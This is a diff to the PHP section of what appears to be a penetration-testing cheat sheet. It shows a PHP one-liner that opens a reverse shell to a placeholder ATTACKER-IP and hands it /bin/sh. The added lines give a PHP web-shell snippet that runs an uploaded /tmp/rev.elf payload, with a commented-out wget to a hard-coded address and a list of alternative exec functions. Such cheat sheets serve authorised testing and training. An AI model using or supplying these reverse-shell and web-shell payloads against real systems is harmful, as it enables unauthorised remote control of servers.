@@ -96,10 +96,29 @@ and without subprocess
 
 ## PHP
 
-```
+```bash
 php -r '$sock=fsockopen("ATTACKER-IP",ATTACKER-PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
 ```
+
+* If possible to upload files, create reverse shell upload and start it using the script below
+
+```php
+<?php 
+
+#shell_exec('wget http://192.168.119.207:4444');
+
+echo "" .shell_exec('/tmp/rev.elf')."\n";
+
+?>
+
+# shell_exec can be replaced with other
+eval
+proc_open
+exec
+system
+```
+
 
 ### PHP webshells
 
